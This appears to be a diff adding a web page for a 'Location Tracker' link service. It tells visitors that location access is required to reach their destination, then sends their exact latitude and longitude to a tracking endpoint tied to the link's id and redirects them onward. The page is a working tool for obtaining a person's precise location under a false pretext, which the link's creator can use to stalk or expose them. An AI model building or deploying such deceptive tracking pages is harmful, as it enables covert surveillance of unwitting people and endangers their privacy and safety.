@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Access - Location Tracker</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <div class="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-md w-full space-y-8 text-center">
+            <!-- Initial State -->
+            <div id="initial" class="bg-white p-8 rounded-lg shadow-lg">
+                <div class="mx-auto h-12 w-12 text-blue-600">
+                    <i class="fas fa-map-marker-alt text-4xl"></i>
+                </div>
+                <h2 class="mt-6 text-2xl font-bold text-gray-900">
+                    Location Access Required
+                </h2>
+                <p class="mt-2 text-gray-600">
+                    Please allow location access to continue to your destination
+                </p>
+                <button onclick="requestLocation()" class="mt-6 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none">
+                    <i class="fas fa-location-arrow mr-2"></i>
+                    Allow Location Access
+                </button>
+            </div>
+
+            <!-- Loading State -->
+            <div id="loading" class="hidden bg-white p-8 rounded-lg shadow-lg">
+                <div class="animate-spin mx-auto h-12 w-12 text-blue-600">
+                    <i class="fas fa-circle-notch text-4xl"></i>
+                </div>
+                <h2 class="mt-6 text-2xl font-bold text-gray-900">
+                    Getting Your Location
+                </h2>
+                <p class="mt-2 text-gray-600">
+                    Please wait while we process your request
+                </p>
+            </div>
+
+            <!-- Success State -->
+            <div id="success" class="hidden bg-white p-8 rounded-lg shadow-lg">
+                <div class="mx-auto h-12 w-12 text-green-500">
+                    <i class="fas fa-check-circle text-4xl"></i>
+                </div>
+                <h2 class="mt-6 text-2xl font-bold text-gray-900">
+                    Location Confirmed
+                </h2>
+                <p class="mt-2 text-gray-600">
+                    Redirecting you to your destination...
+                </p>
+            </div>
+
+            <!-- Error State -->
+            <div id="error" class="hidden bg-white p-8 rounded-lg shadow-lg">
+                <div class="mx-auto h-12 w-12 text-red-500">
+                    <i class="fas fa-exclamation-circle text-4xl"></i>
+                </div>
+                <h2 class="mt-6 text-2xl font-bold text-gray-900">
+                    Location Access Denied
+                </h2>
+                <p class="mt-2 text-gray-600">
+                    Please enable location access and try again
+                </p>
+                <button onclick="requestLocation()" class="mt-6 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none">
+                    <i class="fas fa-redo mr-2"></i>
+                    Try Again
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get tracking ID from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('id');
+
+        if (!trackingId) {
+            showError('Invalid tracking link');
+        }
+
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                showError('Geolocation is not supported by your browser');
+                return;
+            }
+
+            showLoading();
+
+            navigator.geolocation.getCurrentPosition(
+                // Success callback
+                async (position) => {
+                    try {
+                        // Save tracking data
+                        const trackResponse = await fetch(`/api/track/${trackingId}`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            })
+                        });
+
+                        if (!trackResponse.ok) {
+                            throw new Error('Failed to save location data');
+                        }
+
+                        // Get original URL
+                        const urlResponse = await fetch(`/api/original-url/${trackingId}`);
+                        if (!urlResponse.ok) {
+                            throw new Error('Failed to get original URL');
+                        }
+
+                        const { url } = await urlResponse.json();
+                        showSuccess();
+                        
+                        // Redirect after showing success message
+                        setTimeout(() => {
+                            window.location.href = url;
+                        }, 1500);
+                    } catch (error) {
+                        showError(error.message);
+                    }
+                },
+                // Error callback
+                (error) => {
+                    let errorMessage = 'Failed to get location';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = 'Location access was denied';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = 'Location information is unavailable';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = 'Location request timed out';
+                            break;
+                    }
+                    showError(errorMessage);
+                }
+            );
+        }
+
+        function showLoading() {
+            document.getElementById('initial').classList.add('hidden');
+            document.getElementById('error').classList.add('hidden');
+            document.getElementById('success').classList.add('hidden');
+            document.getElementById('loading').classList.remove('hidden');
+        }
+
+        function showSuccess() {
+            document.getElementById('initial').classList.add('hidden');
+            document.getElementById('error').classList.add('hidden');
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('success').classList.remove('hidden');
+        }
+
+        function showError(message) {
+            document.getElementById('initial').classList.add('hidden');
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('success').classList.add('hidden');
+            document.getElementById('error').classList.remove('hidden');
+            document.querySelector('#error p').textContent = message;
+        }
+    </script>
+</body>
+</html>
